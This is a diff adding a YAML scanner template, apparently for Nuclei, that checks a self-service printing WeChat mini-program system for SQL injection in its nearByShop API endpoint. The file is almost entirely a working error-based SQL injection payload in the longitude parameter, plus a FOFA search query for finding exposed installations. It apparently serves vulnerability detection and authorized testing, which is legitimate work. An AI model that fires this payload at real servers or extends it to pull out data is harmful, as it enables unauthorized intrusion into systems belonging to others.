@@ -1,0 +1,33 @@
+id: poc-yaml-sp-wmps-nearbyshop-sqli
+info:
+  name: 自助打印微信小程序系统 nearByShop SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 自助打印微信小程序系统
+    fofa: body="未登录" && body="/admin/login/index.html"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/shop/nearByShop HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        latitude=1&longitude=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(md5({{t1}}) AS NCHAR),0x20)),1,190))),9392)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SQLSTATE[HY000]"
+          - "Malformed GTID set specification"
+          - "{{t2}}"
+        part: body
